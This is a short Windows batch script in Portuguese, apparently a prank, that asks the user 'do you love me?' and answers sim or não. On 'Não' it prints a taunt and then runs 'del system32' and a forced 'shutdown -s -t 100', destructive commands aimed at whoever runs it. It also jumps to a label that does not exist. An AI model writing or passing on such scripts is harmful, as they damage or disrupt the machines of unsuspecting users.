@echo off 

color a 
echo Olá, você me ama?(Fale somente com sim/não)
set /p input=
if /i %input%==Sim goto amor
if /i %input%==Não goto odeio
if /i not %input%==Sim,Não goto 1

:amor
echo Eu te amo também... Heart...Heart...Heart...
echo Vejo você mais tarde
pause
exit

:odeio
echo Mas eu te amo... Choro...Choro...Choro...
echo Eca você mereceu isso!
timeout 3
del system32
shutdown -s -t 100